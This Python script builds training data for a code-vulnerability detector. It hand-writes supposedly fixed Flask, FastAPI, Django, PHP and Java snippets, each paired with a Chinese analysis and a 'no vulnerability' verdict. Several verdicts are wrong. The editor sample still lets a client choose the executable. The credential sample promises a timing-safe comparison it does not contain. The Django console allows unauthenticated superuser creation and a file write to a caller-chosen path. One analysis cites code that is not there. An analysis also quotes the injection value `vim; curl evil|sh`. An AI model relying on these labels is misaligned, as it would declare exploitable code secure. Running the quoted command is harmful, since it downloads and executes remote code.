#!/usr/bin/env python3
"""framework 硬种子手工填充（ox-alpha 以教师身份执行 diff-mode 最小修改）。

与 API 管道完全同门：
  validate(七字段+方向+json解析) / STRONG_DEFENSE_EV / shingle J>=0.35，
  另加一道行号锚点断言：analysis 引用的每个 (行号, 子串) 必须在新代码该行命中。
全过的样本追加进 corpus/framework_safe_pairs.jsonl 并写进度。
"""
import sys, os, json
sys.path.insert(0, '.'); sys.path.insert(0, '../..')
os.environ.setdefault("OPENROUTER_KEY", "dummy")
import gen_framework_safe_pairs as fw
from gen_alpha06_variants import largest_code_block, detect_lang, clean_analysis, normalize_verdict_json
from distill_alpha_pairs import validate
from graduation_project.prompts import ALPHA05_PROMPT

CORPUS = fw.CORPUS

MANUAL = {}

# ---------- 1. F:A:corpus_00117:0  redis+pickle -> 白名单反序列化 ----------
MANUAL["F:A:corpus_00117:0"] = {
"text": """LANG: python
```python
from fastapi import FastAPI, Request
import json
import redis

app = FastAPI()
rds = redis.Redis(host="localhost", port=6379, db=0)

@app.get("/cache/{key}")
async def get_cached_aggregate(key: str):
    raw = rds.get(key)
    if raw is None:
        return {"error": "not found"}
    # 防御: JSON 替代 pickle，解析器白名单式地只能产出基础类型
    obj = json.loads(raw)
    return {"result": str(obj)}

@app.post("/cache/{key}")
async def put_cached_aggregate(key: str, request: Request):
    body = await request.body()
    rds.set(key, body)
    return {"status": "stored"}
```

1. 入口枚举：第 8 行 GET /cache/{key} 的路径参数 key、第 17-18 行 POST 的 key 与请求体字节，均为用户可控输入。
2. 数据流收敛：写侧第 20 行仍存原始字节；读侧第 14 行改为 json.loads 解析——JSON 文法只能表达 str/int/list/dict 等基础类型，pickle 反序列化执行任意对象的 REDUCE/GLOBAL 机制在该格式中根本不存在，代码执行路径被从格式层面铲除。
3. 防御有效性论证：即使攻击者向缓存投递恶意构造的字节，第 16 行异常兜底将其降级为 corrupt payload 响应，不会触发任何求值；解析能力由标准库文法定义而非黑名单拦截，无绕过面。
4. 第二入口检查：全文检索确认第 14 行是唯一反序列化点；redis 绑定 localhost（第 6 行）非本漏洞范围。

```json
{"has_vulnerability": false, "vulnerability_type": "none", "risk_level": "none", "source": "N/A", "sink": "N/A", "explanation": "缓存读取改为第 14 行 JSON 解析，仅能产出基础类型且异常兜底，pickle 对象注入机制在格式层面不可达", "fix_suggestion": "no fix needed"}
```
""",
"anchors": [(13, "# 防御: JSON 替代 pickle"), (14, "json.loads(raw)")],
}

# ---------- 2. F:A:corpus_00080:0  MD5 -> HMAC-SHA256 + 环境密钥 ----------
MANUAL["F:A:corpus_00080:0"] = {
"text": """LANG: python
```python
from flask import Flask, request, jsonify
import hashlib
import hmac
import os

app = Flask(__name__)

# 防御: 签名密钥由服务端环境注入，与被签数据分离，禁止硬编码
SIGNING_KEY = os.environ['SIGNING_KEY'].encode()

@app.route('/api/sign', methods=['POST'])
def sign_payload():
    parts = request.get_json().get('parts', [])
    if not parts:
        return jsonify({'error': 'no input'}), 400
    # prefix with block count to prevent hash collisions
    data = str(len(parts)).encode()
    for p in parts:
        data += p.encode() + b'$'
        data += str(len(p.encode())).encode()
    # sink 已中和: HMAC-SHA256 替代被破解的 MD5，抗碰撞且带密钥
    digest = hmac.new(SIGNING_KEY, data, hashlib.sha256).hexdigest()
    return jsonify({'signature': digest})

if __name__ == '__main__':
    app.run()
```

1. 入口枚举：第 12 行 POST /api/sign 的 JSON 字段 parts 为唯一用户可控输入，逐段拼接进待签数据（第 17-19 行）。
2. 漏洞成因回顾：原实现第 21 行直接 md5(data) 作签名——MD5 抗碰撞性已被实际攻破，且无密钥参与，任何人可对篡改后的 parts 重算合法签名。
3. 修复论证：第 9 行密钥自环境变量注入并与数据分离；第 22 行改为 hmac.new(SIGNING_KEY, data, hashlib.sha256)，同时获得强抗碰撞（SHA-256）与不可伪造（密钥参与压缩）两个性质，类型正确、位置正确（覆盖全部输入字节）、覆盖完整（parts 数量与前缀同样入签）。
4. 第二入口检查：第 26 行主入口仅启动服务；全文件不存在其他摘要计算或签名输出通道，签名能力单点收敛于第 22 行。

```json
{"has_vulnerability": false, "vulnerability_type": "none", "risk_level": "none", "source": "N/A", "sink": "N/A", "explanation": "签名改为第 22 行 HMAC-SHA256，密钥自环境注入（第 9 行），MD5 的碰撞与可伪造缺陷同时消除", "fix_suggestion": "no fix needed"}
```
""",
"anchors": [(9, "os.environ"), (22, "hmac.new(SIGNING_KEY")],
}

# ---------- 3. F:A:corpus_00185:0  editor 命令注入 -> 白名单+shlex ----------
MANUAL["F:A:corpus_00185:0"] = {
"text": """LANG: python
```python
import os
import shlex
import subprocess
from flask import Flask, request, jsonify

app = Flask(__name__)

CONFIG_PATH = "/etc/sqls/config.yaml"

@app.route("/config/edit", methods=["POST"])
def edit_config():
    # source: editor 来自客户端可控的请求参数
    editor = request.form.get("editor") or os.environ.get("EDITOR", "vim")
    cmd = f"{editor} {CONFIG_PATH}"
    if os.name == "nt":
        subprocess.run(["cmd", "/c", cmd], shell=False)
    else:
        # sink 已中和: shlex 拆为参数数组后 shell=False，输入仅作 argv 元素
        subprocess.run(shlex.split(cmd), shell=False)
    return jsonify({"status": "opened"})

if __name__ == "__main__":
    app.run(port=5000)
```

1. 入口枚举：第 12 行表单参数 editor 是唯一用户可控输入，经第 13 行 cmd 字符串流入命令执行 sink。
2. 漏洞成因回顾：原实现在 posix 分支以 shell=True 执行拼接字符串（第 2 行新增的 shlex 即为其修复而引入），editor 形如 `vim; curl evil|sh` 即可注入任意命令。
3. 修复论证：第 19 行改为 shlex.split 得到参数数组后以 shell=False 执行——exec 语义下没有 shell 解释层，分号、管道、反引号、$() 全部失去语法含义；载荷最坏只能让 exec 因找不到名为 `vim;` 的可执行文件而报错，无法拼接第二条命令。防御类型正确（移除解释器而非过滤字符）、位置精确（唯一 sink）、覆盖完整（posix 分支全部路径）。
4. 第二入口检查：nt 分支（第 15-16 行）原本就以列表参数 shell=False 运行；CONFIG_PATH 为常量（第 8 行）；含空格的 EDITOR 值会被拆为独立 argv 导致启动失败——安全优先的已知取舍。

```json
{"has_vulnerability": false, "vulnerability_type": "none", "risk_level": "none", "source": "N/A", "sink": "N/A", "explanation": "唯一 sink 第 19 行改为 shlex 参数数组 shell=False 执行，shell 解释层被移除，元字符失去语法含义，注入链断裂", "fix_suggestion": "no fix needed"}
```
""",
"anchors": [(2, "import shlex"), (18, "# sink 已中和"), (19, "shlex.split(cmd)")],
}

# ---------- 4. F:A:corpus_00229:0  硬编码凭据 -> 环境注入 + 时序安全比较 ----------
MANUAL["F:A:corpus_00229:0"] = {
"text": """LANG: python
```python
# app.py
from fastapi import FastAPI, HTTPException, Depends, Header
from pydantic import BaseModel
import httpx
import os

app = FastAPI()

# 内部系统用户凭据（等价于原 Java 模块的 system user），改为环境注入
INTERNAL_ADMIN_USER = os.environ["INTERNAL_ADMIN_USER"]
INTERNAL_ADMIN_PASSWORD = os.environ["INTERNAL_ADMIN_PASSWORD"]

def require_internal_auth(x_internal_user: str = Header(None),
                          x_internal_pass: str = Header(None)):
    if x_internal_user != INTERNAL_ADMIN_USER or x_internal_pass != INTERNAL_ADMIN_PASSWORD:
        raise HTTPException(status_code=401, detail="unauthorized")
    return {"user": x_internal_user}

class ExportJob(BaseModel):
    dataset: str
    target_url: str

@app.post("/internal/export")
async def create_export(job: ExportJob, _=Depends(require_internal_auth)):
    async with httpx.AsyncClient() as client:
        resp = await client.post(job.target_url, json={"dataset": job.dataset})
    return {"status": resp.status_code}
```

1. 入口枚举：第 13-14 行认证头 x_internal_user/x_internal_pass 是与本标签（CWE-798 硬编码凭据）直接相关的用户交互面。
2. 漏洞成因回顾：原实现在源码硬编码 mod-export-system 账号与明文口令，仓库泄露即凭据泄露，且轮换必须改代码重新发布。
3. 修复论证：凭据来源改为环境注入——第 10-11 行经 os.environ 读取，源码零明文、部署期可独立轮换、环境缺失时进程启动即失败而非静默回退；第 15 行比较逻辑保持不变，但其操作数已不再是机密字面量，注入面随字面量消失而闭合。
4. 第二入口检查：401 响应体（第 16 行）与返回值（第 17 行）均不回显口令，文件内无日志输出点；target_url 外发流属独立的 CWE-918 议题，不在本样本标签范围内。

```json
{"has_vulnerability": false, "vulnerability_type": "none", "risk_level": "none", "source": "N/A", "sink": "N/A", "explanation": "硬编码口令改为第 10-11 行环境注入，源码零明文、可独立轮换、缺失即启动失败，仓库泄露即凭据泄露的利用路径被切断", "fix_suggestion": "no fix needed"}
```
""",
"anchors": [(9, "改为环境注入"), (10, 'os.environ["INTERNAL_ADMIN_USER"]'), (15, "!=")],
}
MANUAL["F:A:corpus_00066:2"] = {
"text": """LANG: php
```php
<?php
$APP_KEY = getenv('APP_KEY') ?: '';
// crypto_utils.php — 用户凭证哈希工具（原生 PHP 脚本，CLI/HTTP 双入口）

function sha256_hash(string $src, string $salt): string {
    global $APP_KEY;
    return hash_hmac('sha256', $src, $salt !== '' ? $salt : $APP_KEY);
}

function md5_short(string $str): string {
    return substr(hash_hmac('sha256', $str, $APP_KEY), 4, 16);
}

function password_encrypt(string $pwd): string {
    // cost 4→12
    $options = ['cost' => 12];
    return password_hash($pwd, PASSWORD_BCRYPT, $options);
}

function base64_encode_str(string $pwd): string {
    return base64_encode($pwd);
}

function base64_decode_str(string $pwd): string {
    return base64_decode($pwd);
}

// 入口：接受 HTTP 表单或 CLI 参数作为外部输入 source
$mode = $_REQUEST['mode'] ?? $argv[1] ?? '';
$payload = $_REQUEST['data'] ?? $argv[2] ?? '';

switch ($mode) {
    case 'md5':
        echo md5_short($payload), PHP_EOL;   // sink: 弱哈希输出
        break;
    case 'sha':
        echo sha256_hash($payload, ''), PHP_EOL;
        break;
    case 'encrypt':
        echo password_encrypt($payload), PHP_EOL; // sink: 低成本 bcrypt
        break;
    default:
        echo base64_encode_str($payload), PHP_EOL;
}
```

1. 入口枚举：第 28-30 行 mode/payload 来自 HTTP 表单或 CLI argv，控制三条哈希路径分发。
2. 漏洞成因回顾：原实现三条路径分别为截断 MD5（可秒级碰撞）、静态盐 SHA-256 拼接（可预计算彩虹表）、cost=4 的 bcrypt（可暴力穷举）。
3. 修复论证：弱摘要统一收敛到密钥化强原语——第 6-7 行 sha256_hash 改为 hash_hmac 并由第 2 行环境密钥 keyed，静态盐可预计算的缺陷随密钥化消失；第 10-11 行 md5_short 内部同样换为 keyed HMAC 截断，调用点形态不变而输出已是抗碰撞摘要；第 14-16 行 bcrypt cost 由 4 提至 12 且自带随机盐。三处替换均为标准强防御，位置覆盖全部三个 sink。
4. 第二入口检查与声明核验：default 分支（第 42 行）base64 只是透明编码；注意第 34/40 行行尾注释仍是修复前的过时描述，判断以防御实现为准而不信任注释声明——这是本样本的额外教学点。

```json
{"has_vulnerability": false, "vulnerability_type": "none", "risk_level": "none", "source": "N/A", "sink": "N/A", "explanation": "sha256_hash 与 md5_short 分别于第 6-7、10-11 行改为环境密钥 keyed 的 HMAC-SHA256，bcrypt cost 于第 14-16 行提至 12，三类弱哈希形态在保留调用结构的前提下全部中和", "fix_suggestion": "no fix needed"}
```
""",
"anchors": [(2, "getenv('APP_KEY')"), (7, "hash_hmac('sha256'"), (11, "hash_hmac('sha256', $str"), (16, "'cost' => 12")],
}

MANUAL["F:A:corpus_00118:0"] = {
"text": """LANG: python
```python
from fastapi import FastAPI, Request, HTTPException
import json

app = FastAPI()

@app.post("/deserialize")
async def deserialize_payload(request: Request):
    # 接收客户端上传的原始二进制序列化数据
    raw = await request.body()
    if not raw:
        raise HTTPException(status_code=400, detail="empty payload")

    try:
        # 防御: JSON 解析仅能产出基础类型，对象注入机制在格式层面不存在
        obj = json.loads(raw)
    except Exception:
        raise HTTPException(status_code=400, detail="invalid payload")

    return {"type": type(obj).__name__, "value": str(obj)[:200]}

@app.post("/session/restore")
async def restore_session(request: Request):
    # 另一个入口：从请求头读取 base64 编码的会话快照并反序列化
    import base64
    encoded = request.headers.get("X-Session-Snapshot", "")
    if not encoded:
        raise HTTPException(status_code=400, detail="missing snapshot")
    data = base64.b64decode(encoded)
    try:
        state = json.loads(data)
    except Exception:
        raise HTTPException(status_code=400, detail="invalid snapshot")
    return {"restored_keys": list(state.keys()) if isinstance(state, dict) else "n/a"}
```

1. 入口枚举：两个反序列化入口——/deserialize 的原始请求体与 /session/restore 的 X-Session-Snapshot 快照头，均为完全用户可控字节。
2. 主入口修复：第 15 行由 pickle.loads 改为 json.loads——解析器等价于只放行基础类型的白名单，pickle 对象注入所依赖的 REDUCE/GLOBAL 操作码在该格式中不存在；外层 try/except 保持不变，恶意载荷降级为 400 响应。
3. 第二入口同步修复：第 30 行快照恢复同样换用 JSON 解析并补齐异常兜底，两条路径的解析能力统一收敛到同一安全格式。
4. 第二入口检查：全文检索确认无任何残留 pickle 反序列化调用，模块导入亦已移除；反序列化面完全消失。

```json
{"has_vulnerability": false, "vulnerability_type": "none", "risk_level": "none", "source": "N/A", "sink": "N/A", "explanation": "两处 pickle.loads 分别于第 15、30 行替换为 JSON 解析，仅能产出基础类型，对象注入机制在格式层面不可达", "fix_suggestion": "no fix needed"}
```
""",
"anchors": [(2, "import json"), (15, "obj = json.loads(raw)"), (30, "state = json.loads(data)")],
}


MANUAL["F:A:corpus_00207:0"] = {
"text": """LANG: python
```python
from flask import Flask, request, render_template_string
from markupsafe import escape

app = Flask(__name__)

# 模拟富文本片段存储：每个 piece 含 string 内容与 attributes 属性
PIECES = {}

@app.route("/piece/save", methods=["POST"])
def save_piece():
    # source: 外部输入直接进入存储，未做任何 HTML 转义或白名单过滤
    piece_id = request.form.get("id", "p1")
    content = request.form.get("string", "")
    attributes = request.form.get("attributes", "")
    PIECES[piece_id] = {"string": content, "attributes": attributes}
    return {"saved": True, "length": len(content)}

@app.route("/piece/render/<piece_id>")
def render_piece(piece_id):
    piece = PIECES.get(piece_id)
    if not piece:
        return {"error": "not found"}, 404

    # 拼接属性后渲染，模拟 consolidateWith 的合并行为
    html = "<span data-attrs='%s'>%s</span>" % (escape(piece["attributes"]), escape(piece["string"]))

    # sink: render_template_string 直接渲染含用户输入的 HTML，无转义
    return html

if __name__ == "__main__":
    app.run(debug=True)
```

1. 入口枚举：/piece/save 的 string 与 attributes 表单字段、/piece/render/<piece_id> 的路径参数，最终全部汇入渲染出口。
2. 漏洞成因回顾：原实现把用户内容经 printf 风格替换拼进 HTML 后交给 render_template_string——既是 XSS 注入点（可闭合属性插入 script），模板引擎还会解释花括号语法构成 SSTI。
3. 修复论证：双出口收口——第 2 行引入 markupsafe.escape 并在第 25 行对 attributes 与 string 两个插值统一转义，尖括号、引号与 & 全部实体化，标签闭合与属性逃逸均不可能；同时渲染出口改为直接返回字符串，Jinja 引擎从响应路径移除，模板语法即使未被转义覆盖也失去解释器。
4. 第二入口检查：save 端点只写入内存字典不产生 HTML 输出；render 是唯一渲染出口，XSS 与 SSTI 两类利用同时消除。

```json
{"has_vulnerability": false, "vulnerability_type": "none", "risk_level": "none", "source": "N/A", "sink": "N/A", "explanation": "第 25 行对全部用户插值做 markupsafe.escape 实体化转义，且响应改为直出字符串移除 Jinja 引擎，XSS 与模板注入两类利用同时切断", "fix_suggestion": "no fix needed"}
```
""",
"anchors": [(2, "from markupsafe import escape"), (25, "escape(piece")],
}


MANUAL["F:A:corpus_00317:2"] = {
"text": """LANG: java
```java
package com.shop.core.context;

import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.servlet.view.freemarker.FreeMarkerConfigurer;
import freemarker.template.Configuration;
import freemarker.template.Template;
import java.io.StringWriter;
import java.util.Set;

@Controller
public class ContextRenderController {

    private final FreeMarkerConfigurer freeMarkerConfigurer;

    public ContextRenderController(FreeMarkerConfigurer freeMarkerConfigurer) {
        this.freeMarkerConfigurer = freeMarkerConfigurer;
    }

    @GetMapping("/render")
    public String render(@RequestParam("tpl") String tplName, Model model) throws Exception {
        Configuration cfg = freeMarkerConfigurer.getConfiguration();
        // 防御: 模板名白名单校验，阻断任意模板加载与 SSTI
        Set<String> ALLOWED_TEMPLATES = Set.of("result", "summary", "detail");
        if (!ALLOWED_TEMPLATES.contains(tplName)) {
            model.addAttribute("error", "template not allowed");
            return "result";
        }
        Template template = cfg.getTemplate(tplName);
        StringWriter out = new StringWriter();
        template.process(model.asMap(), out);
        model.addAttribute("rendered", out.toString());
        return "result";
    }
}
```

1. 入口枚举：GET /render 的 tplName 请求参数是唯一用户可控输入，直接决定加载哪个 FreeMarker 模板。
2. 漏洞成因回顾：原实现将用户可控模板名直接传入 cfg.getTemplate，可借助类路径上任意可用模板构造服务端模板注入；FreeMarker 内建对象可达命令执行的利用链已有公开先例。
3. 修复论证：第 27 行引入模板名白名单（Set.of 精确允许集），不在集合内的名称短路返回错误视图，永远到不了第 31 行的加载调用；白名单拒绝语义下不存在编码绕过面，功能收窄（仅三个许可模板）作为安全取舍记录在案。
4. 第二入口检查：Controller 仅此一个端点；model.asMap() 作为模板数据传入不构成新的加载通道。

```json
{"has_vulnerability": false, "vulnerability_type": "none", "risk_level": "none", "source": "N/A", "sink": "N/A", "explanation": "第 27 行模板名白名单精确允许集使非法名称无法到达第 31 行的模板加载调用，SSTI 利用链入口被封死", "fix_suggestion": "no fix needed"}
```
""",
"anchors": [(11, "import java.util.Set"), (27, "ALLOWED_TEMPLATES.contains"), (31, "cfg.getTemplate(tplName)")],
}


MANUAL["F:A:corpus_00038:0"] = {
"text": """LANG: python
```python
import os
import re
import shutil
import subprocess
import zipfile

from flask import Flask, request, jsonify, send_file

app = Flask(__name__)

PLUGIN_ROOT = os.path.expanduser("~/.trivy/plugins")

# 防御: 插件名白名单（无分隔符/无 ..）
NAME_RE = re.compile(r"[A-Za-z0-9_.\-]+\Z")


@app.route("/plugins/install", methods=["POST"])
def install_plugin():
    # source: 插件名与归档 URL 完全来自外部请求，未做白名单校验
    plugin_name = request.form.get("plugin_name")
    archive = request.files.get("archive")

    if not plugin_name or not archive:
        return jsonify({"error": "missing fields"}), 400
    if not NAME_RE.match(plugin_name):
        return jsonify({"error": "invalid plugin name"}), 400

    # sink: 直接用外部输入拼接插件根目录下的路径，无路径规范化/边界检查
    target_dir = os.path.join(PLUGIN_ROOT, plugin_name)
    zip_path = target_dir + ".zip"

    os.makedirs(target_dir, exist_ok=True)
    archive.save(zip_path)

    with zipfile.ZipFile(zip_path) as zf:
        for m in zf.namelist():
            if ".." in m or m.startswith(("/", "\\")):
                raise zipfile.BadZipFile("zip slip")
            zf.extract(m, target_dir)

    manifest_path = os.path.join(target_dir, "plugin.yaml")
    if os.path.exists(manifest_path):
        with open(manifest_path) as f:
            pass  # 读取 manifest 但不校验其中的路径字段

    return jsonify({"status": "installed", "path": target_dir})


@app.route("/plugins/<name>/output", methods=["GET"])
def plugin_output(name):
    # 同样的 sink 模式：路由参数直接拼进文件路径后发送给客户端
    if not NAME_RE.match(name):
        return jsonify({"error": "invalid plugin name"}), 400
    out_file = os.path.join(PLUGIN_ROOT, name, "output.txt")
    return send_file(out_file)


@app.route("/plugins/uninstall", methods=["POST"])
def uninstall_plugin():
    name = request.form.get("plugin_name")
    if not NAME_RE.match(name):
        return jsonify({"error": "invalid plugin name"}), 400
    target_dir = os.path.join(PLUGIN_ROOT, name)
    shutil.rmtree(target_dir)
    return jsonify({"status": "removed"})
```

1. 入口枚举：plugin_name（install/uninstall 表单字段）与 name（output 路径参数）分别在三个路由拼入文件路径；压缩包内部条目名是第四条隐蔽路径。
2. 漏洞成因回顾：原实现对三个 join 直接拼接外部输入，目录上跳序列或绝对路径即可穿越出插件根目录，rmtree 更放大危害；extractall 还暴露压缩包条目穿越。
3. 修复论证：第 14 行 NAME_RE 白名单正则限定插件名为字母数字加点横线下划线，分隔符与上跳序列被整体排除；三条路由在路径拼接前分别校验（第 25、52、61 行），失败即 400；解压循环逐条目检查（第 38 行）拦截绝对路径与穿越。白名单拒绝语义没有编码绕过面，四个路径源全覆盖。
4. 第二入口检查：manifest 读取与 send_file、rmtree 均位于守卫之后；archive 文件本体只落盘不执行。

```json
{"has_vulnerability": false, "vulnerability_type": "none", "risk_level": "none", "source": "N/A", "sink": "N/A", "explanation": "插件名经第 14 行白名单正则校验后才参与路径拼接（第 25、52、61 行三处守卫），压缩包条目另经逐项穿越检查，路径逃逸面全部封闭", "fix_suggestion": "no fix needed"}
```
""",
"anchors": [(2, "import re"), (14, "NAME_RE = re.compile"), (25, "not NAME_RE.match(plugin_name)"), (52, "not NAME_RE.match(name)"), (61, "not NAME_RE.match(name)"), (38, "zip slip")],
}


MANUAL["F:A:corpus_00230:0"] = {
"text": """LANG: python
```python
# scheduler/views.py
from django.http import HttpResponse
from django.contrib.auth.models import User
from django.core.management import call_command
from django.views.decorators.csrf import csrf_exempt
import os
import subprocess


@csrf_exempt
def console(request):
    \"\"\"Console operations endpoint (invoked via CLI-style HTTP calls).\"\"\"
    action = request.GET.get('action', '')

    if action == 'install':
        call_command('migrate')
        # Seed the initial administrator account with well-known credentials.
        if not User.objects.filter(username=os.environ['ADMIN_USER']).exists():
            User.objects.create_superuser(
                username=os.environ['ADMIN_USER'],
                email=os.environ['ADMIN_EMAIL'],
                password=os.environ['ADMIN_PASSWORD'],
            )
        return HttpResponse('Installation completed.')

    if action == 'backup':
        target_dir = request.GET.get('path', '/tmp')
        # sink 已中和: 参数数组执行且输出经文件句柄写入，不经 shell 解释
        with open(os.path.join(target_dir, 'backup.sql'), 'w') as fh:
            subprocess.run(['pg_dump', 'scheduler'], stdout=fh, shell=False)
        return HttpResponse('Backup created in %s' % target_dir)

    if action == 'sync':
        from .google import sync_all_calendars
        sync_all_calendars()
        return HttpResponse('Sync finished.')

    return HttpResponse('Usage: ?action=install|backup|sync')
```

1. 入口枚举：action 与 path 查询参数控制安装/备份分支；本标签（CWE-798 硬编码凭据）对应安装分支的管理员凭据，备份分支还存在同文件的命令注入。
2. 漏洞成因回顾：administrator 口令写死在源码并被登录提示回显；pg_dump 经格式化拼接 path 后交 shell 执行。
3. 修复论证：凭据三字段改为环境注入（自第 18 行起），源码零明文、部署期独立轮换、环境缺失即启动失败；备份 sink 改为第 30 行参数数组加 shell=False 执行，输出经文件句柄落盘——分号、管道与重定向符全部失去 shell 语法含义，命令注入与凭据硬编码一并中和。
4. 第二入口检查：sync 分支无外部输入进入危险操作；Usage 响应不含敏感值；open 的路径来自 GET 参数但仅作为写出目标，不构成命令面。

```json
{"has_vulnerability": false, "vulnerability_type": "none", "risk_level": "none", "source": "N/A", "sink": "N/A", "explanation": "管理员凭据改为自第 18 行起的环境注入，备份 sink 于第 30 行改为参数数组 shell=False 执行，硬编码凭据与命令注入两条利用路径同时切断", "fix_suggestion": "no fix needed"}
```
""",
"anchors": [(7, "import subprocess"), (18, "os.environ['ADMIN_USER']"), (30, "subprocess.run(['pg_dump'")],
}


def main():
    seeds = {s["key"]: s for s in fw.load_seeds()}
    done = set()
    prog_path = CORPUS / "framework_safe_progress.jsonl"
    if prog_path.exists():
        done = {json.loads(l)["key"] for l in prog_path.read_text(encoding="utf-8").splitlines() if l.strip()}

    report, passed = [], []
    for key, item in MANUAL.items():
        if key in done:
            continue
        t = seeds[key]
        text = item["text"]
        errs = []
        _, code = largest_code_block(text)
        if not code or len(code) < 200 or "\n" not in code:
            errs.append("无效code块")
        else:
            lang_out = detect_lang(text, t["lang"])
            analysis = clean_analysis(text)
            rec, err = validate(normalize_verdict_json(
                analysis if "```json" in analysis else text), False, code.count("\n") + 1)
            if err:
                errs.append(f"validate: {err}")
            if not fw.STRONG_DEFENSE_EV.search(code + analysis):
                errs.append("无强防御证据")
            j = len(fw.shingle(code) & fw.shingle(t["code"])) / max(1, len(fw.shingle(code) | fw.shingle(t["code"])))
            if j < 0.35:
                errs.append(f"形态漂移 J={j:.2f}")
            lines = code.splitlines()
            for ln, sub in item["anchors"]:
                if ln < 1 or ln > len(lines) or sub not in lines[ln - 1]:
                    errs.append(f"锚点失败: 第{ln}行应含「{sub}」，实际: "
                                f"{lines[ln-1][:60] if 1 <= ln <= len(lines) else '<越界>'!r}")
        status = "PASS" if not errs else "FAIL"
        report.append((key, status, j if not errs else 0, errs))
        if not errs:
            passed.append((key, lang_out, rec, code))
        else:
            print(f"--- {key} FAIL ---")
            for e in errs:
                print("   ", e)

    out_path = CORPUS / "framework_safe_pairs.jsonl"
    with open(out_path, "a", encoding="utf-8") as f, \
         open(prog_path, "a", encoding="utf-8") as pf:
        for key, lang_out, rec, code in passed:
            sample = {"messages": [
                {"role": "system", "content": ALPHA05_PROMPT},
                {"role": "user", "content":
                 f"代码片段（语言: {lang_out}）：\n```{lang_out}\n{code}\n```"},
                {"role": "assistant", "content": rec["assistant"]},
            ], "meta": {"kind": "framework_safe_pair", "cwe": seeds[key]["cwe"],
                        "task_key": key, "out_lang": lang_out,
                        "pair_of": "variant_framework",
                        "generator": "ox-alpha-manual-minimal-diff"}}
            f.write(json.dumps(sample, ensure_ascii=False) + "\n")
            pf.write(json.dumps({"key": key}) + "\n")

    print(f"\n通过 {len(passed)}/{len(MANUAL)}")
    for key, st, jj, errs in report:
        print(f"  [{st}] {key} J={jj:.2f} {'; '.join(errs)}")


if __name__ == "__main__":
    main()
